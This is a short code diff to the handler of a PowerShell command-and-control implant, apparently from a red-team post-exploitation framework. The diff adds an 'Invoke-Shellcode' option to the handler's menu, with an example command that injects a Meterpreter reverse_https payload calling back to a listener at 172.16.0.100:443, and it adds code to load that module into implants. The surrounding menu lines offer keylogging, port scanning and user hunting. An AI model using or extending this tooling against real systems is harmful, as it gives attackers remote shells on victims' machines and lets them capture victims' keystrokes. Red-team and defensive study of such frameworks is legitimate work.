@@ -200,6 +200,7 @@ function Implant-Handler
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
+        write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443" -ForegroundColor Green
         write-host `n "Implant Handler: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Back" -ForegroundColor Green 
@@ -733,6 +734,10 @@ $error.clear()
             if ($pscommand.tolower().startswith('invoke-runas'))
             {
                 CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('invoke-shellcode'))
+            {
+                CheckModuleLoaded "invoke-shellcode.ps1" $psrandomuri
             }
             if ($pscommand.tolower().startswith('get-pass-notexp'))
             {
